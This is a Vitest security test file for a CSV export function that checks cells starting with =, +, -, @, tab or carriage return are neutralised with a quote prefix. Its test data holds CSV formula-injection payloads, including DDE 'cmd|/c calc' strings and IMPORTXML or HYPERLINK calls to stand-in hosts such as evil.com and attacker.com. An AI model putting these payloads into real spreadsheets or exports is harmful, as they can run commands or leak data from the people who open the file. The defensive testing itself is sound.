/**
 * Security Tests for CSV Export
 * Tests CSV formula injection prevention
 */

import { describe, it, expect } from 'vitest';
import { arrayToCSV } from '../csv';

describe('CSV Security - Formula Injection Prevention', () => {
  it('should prevent formula injection with = prefix', () => {
    const data = [
      { name: '=1+1', value: 100 },
      { name: 'Safe Name', value: 200 }
    ];

    const csv = arrayToCSV(data);

    expect(csv).toContain("'=1+1");
    expect(csv).not.toMatch(/^=1\+1/m);
  });

  it('should prevent formula injection with + prefix', () => {
    const data = [
      { name: '+1+1', value: 100 }
    ];

    const csv = arrayToCSV(data);

    expect(csv).toContain("'+1+1");
  });

  it('should prevent formula injection with - prefix', () => {
    const data = [
      { name: '-1+1', value: 100 }
    ];

    const csv = arrayToCSV(data);

    expect(csv).toContain("'-1+1");
  });

  it('should prevent formula injection with @ prefix', () => {
    const data = [
      { name: '@SUM(A1:A10)', value: 100 }
    ];

    const csv = arrayToCSV(data);

    expect(csv).toContain("'@SUM(A1:A10)");
  });

  it('should prevent tab character formula injection', () => {
    const data = [
      { name: '\t=1+1', value: 100 }
    ];

    const csv = arrayToCSV(data);

    expect(csv).toContain("'\t=1+1");
  });

  it('should prevent carriage return formula injection', () => {
    const data = [
      { name: '\r=1+1', value: 100 }
    ];

    const csv = arrayToCSV(data);

    expect(csv).toContain("'\r=1+1");
  });

  it('should handle complex formula injection attempts', () => {
    const data = [
      { athlete: '=cmd|/c calc', team: '@IMPORTXML("http://evil.com")' },
      { athlete: '+2+3', team: '-5-5' }
    ];

    const csv = arrayToCSV(data);

    expect(csv).toContain("'=cmd|/c calc");
    expect(csv).toContain("'@IMPORTXML");
    expect(csv).toContain("'+2+3");
    expect(csv).toContain("'-5-5");
  });

  it('should not affect normal values', () => {
    const data = [
      { name: 'John Doe', value: 100 },
      { name: 'Jane Smith', value: 200 }
    ];

    const csv = arrayToCSV(data);

    expect(csv).toContain('John Doe');
    expect(csv).toContain('Jane Smith');
    expect(csv).not.toContain("'John");
    expect(csv).not.toContain("'Jane");
  });

  it('should handle values with dangerous characters in middle', () => {
    const data = [
      { name: 'Team = Winners', value: 100 },
      { name: 'Score + Bonus', value: 200 }
    ];

    const csv = arrayToCSV(data);

    // Should NOT prefix if dangerous char is not at start
    expect(csv).toContain('Team = Winners');
    expect(csv).toContain('Score + Bonus');
    expect(csv).not.toContain("'Team");
  });

  it('should handle null and undefined values', () => {
    const data = [
      { name: null, value: 100 },
      { name: undefined, value: 200 },
      { name: 'Normal', value: 300 }
    ];

    const csv = arrayToCSV(data);

    expect(csv).toContain('name,value');
    expect(csv).toContain(',100');
    expect(csv).toContain(',200');
    expect(csv).toContain('Normal,300');
  });

  it('should handle combined quote escaping and formula prevention', () => {
    const data = [
      { name: '=1+1, "quoted"', value: 100 }
    ];

    const csv = arrayToCSV(data);

    // Should prefix with quote AND escape internal quotes
    expect(csv).toContain("'=1+1");
    expect(csv).toContain('""quoted""');
  });

  it('should prevent real-world exploitation attempts', () => {
    const data = [
      // DDE attack
      { athlete: '=cmd|"/c calc"!A1', team: 'Team A' },
      // IMPORTXML attack
      { athlete: '@IMPORTXML("http://attacker.com/xss.xml")', team: 'Team B' },
      // SUM exploitation
      { athlete: '+1-1+cmd|"/c calc"!A1', team: 'Team C' }
    ];

    const csv = arrayToCSV(data);

    // All should be prefixed with single quote
    expect(csv).toContain("'=cmd");
    expect(csv).toContain("'@IMPORTXML");
    expect(csv).toContain("'+1-1+cmd");
  });

  it('should handle athlete names with formulas in actual export scenario', () => {
    const data = [
      {
        'Athlete ID': 'athlete-1',
        'Athlete Name': '=HYPERLINK("http://evil.com")',
        'Team': '@SUM(A1:A10)',
        'Value': 1.23
      }
    ];

    const csv = arrayToCSV(data);

    expect(csv).toContain("'=HYPERLINK");
    expect(csv).toContain("'@SUM");
  });
});
